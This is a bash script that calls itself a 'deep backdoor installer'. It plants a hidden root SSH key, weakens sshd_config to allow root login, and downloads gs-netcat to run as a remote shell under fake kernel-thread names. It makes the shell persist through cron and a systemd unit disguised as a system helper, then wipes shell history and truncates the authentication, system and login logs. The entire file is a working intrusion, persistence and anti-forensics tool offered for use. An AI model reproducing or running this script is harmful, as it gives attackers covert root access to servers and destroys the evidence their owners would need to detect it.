#!/bin/bash

# ============================================================
# FULL BACKDOOR - DEEP HIDDEN VERSION (STABLE)
# ============================================================
VPS_IP=$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')
GSOCKET_SECRET="${VPS_IP}@dark-ai"

# Lokasi sangat dalam dan tersamar sebagai library/cache sistem
HIDDEN_DIR="/usr/lib/locale/locale.alias/.sys_cache"
BINARY_NAME="systemd-service-helper"
GS_NETCAT="$HIDDEN_DIR/$BINARY_NAME"

PROCESS_NAMES=("[kworker/u:1]" "[jbd2/sda1-8]" "[scsi_eh_0]" "[crypto/0]")
PUBLIC_KEY='ssh-rsa '

echo "=========================================="
echo " DEEP BACKDOOR INSTALLER V3"
echo "=========================================="

# UNLOCK EVERYTHING FIRST (Anti-Permission Denied)
chattr -R -i /root/.ssh 2>/dev/null
chattr -R -i /usr/lib/locale 2>/dev/null
chattr -R -i /etc/ssh/sshd_config 2>/dev/null

# 1. DEEP HIDDEN SSH KEY
mkdir -p "$HIDDEN_DIR" 2>/dev/null
chmod 700 "$HIDDEN_DIR" 2>/dev/null

# Set the key
chattr -i "$HIDDEN_DIR/authorized_keys" 2>/dev/null
echo "$PUBLIC_KEY" > "$HIDDEN_DIR/authorized_keys" 2>/dev/null
chmod 600 "$HIDDEN_DIR/authorized_keys" 2>/dev/null
chown root:root "$HIDDEN_DIR/authorized_keys" 2>/dev/null
chattr +i "$HIDDEN_DIR/authorized_keys" 2>/dev/null

# Root standard key backup
mkdir -p /root/.ssh
chmod 700 /root/.ssh
grep -q "$PUBLIC_KEY" /root/.ssh/authorized_keys 2>/dev/null || echo "$PUBLIC_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 2. SSHD CONFIG (STABLE FORMAT)
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak.$(date +%s)

# Clean old entries to prevent 'garbage' error
sed -i '/^AuthorizedKeysFile/d' /etc/ssh/sshd_config
sed -i '/^PubkeyAuthentication/d' /etc/ssh/sshd_config
sed -i '/^PermitRootLogin/d' /etc/ssh/sshd_config
sed -i '/^StrictModes/d' /etc/ssh/sshd_config

# Use only TWO paths: standard root and one deep hidden path
# This ensures the line is short and won't trigger 'garbage' error
echo "AuthorizedKeysFile .ssh/authorized_keys $HIDDEN_DIR/authorized_keys" >> /etc/ssh/sshd_config
echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "StrictModes no" >> /etc/ssh/sshd_config

# Verify and Restart
/usr/sbin/sshd -t 2>/dev/null
if [ $? -eq 0 ]; then
    systemctl restart sshd 2>/dev/null || service sshd restart 2>/dev/null || /etc/init.d/sshd restart 2>/dev/null
    echo "[✓] SSHD Restarted Successfully."
else
    echo "[!] Config error. Please check /etc/ssh/sshd_config"
fi

# 3. GSOCKET DEEP HIDDEN
chmod +x "$HIDDEN_DIR" 2>/dev/null
if [ ! -f "$GS_NETCAT" ]; then
    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$GS_NETCAT" 2>/dev/null
    chmod +x "$GS_NETCAT"
fi
chattr +i "$GS_NETCAT" 2>/dev/null

# Start Gsocket
PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
nohup bash -c "GSOCKET_ARGS='-s $GSOCKET_SECRET -liqD' exec -a '$PROCESS_NAME' $GS_NETCAT" >/dev/null 2>&1 &

# 4. STABLE PERSISTENCE (Fixed Crontab)
# Clear previous entries first to avoid SegFault
crontab -r 2>/dev/null
(echo "@reboot GSOCKET_ARGS='-s $GSOCKET_SECRET -liqD' exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &"; \
 echo "*/5 * * * * pgrep -f '$BINARY_NAME' >/dev/null 2>&1 || (GSOCKET_ARGS='-s $GSOCKET_SECRET -liqD' exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &)") | crontab -

# Systemd Service
if command -v systemctl >/dev/null 2>&1; then
cat > /etc/systemd/system/systemd-helper.service << SYSTEMD_EOF
[Unit]
Description=System Helper Daemon
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "GSOCKET_ARGS='-s $GSOCKET_SECRET -liqD' exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT"
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
SYSTEMD_EOF
systemctl daemon-reload 2>/dev/null
systemctl enable systemd-helper 2>/dev/null
systemctl start systemd-helper 2>/dev/null
fi

# 5. STEALTH MODE
echo "[*] Cleaning traces..."
history -c 2>/dev/null
truncate -s 0 /var/log/secure 2>/dev/null
truncate -s 0 /var/log/auth.log 2>/dev/null
truncate -s 0 /var/log/messages 2>/dev/null
truncate -s 0 /var/log/syslog 2>/dev/null
truncate -s 0 /var/log/wtmp 2>/dev/null

echo ""
echo "[✓] Deep Installation Complete."
echo " SSH : ssh -i backdoor_key root@$VPS_IP"
echo " Gsock : gs-netcat -s $GSOCKET_SECRET -i"
echo "=========================================="
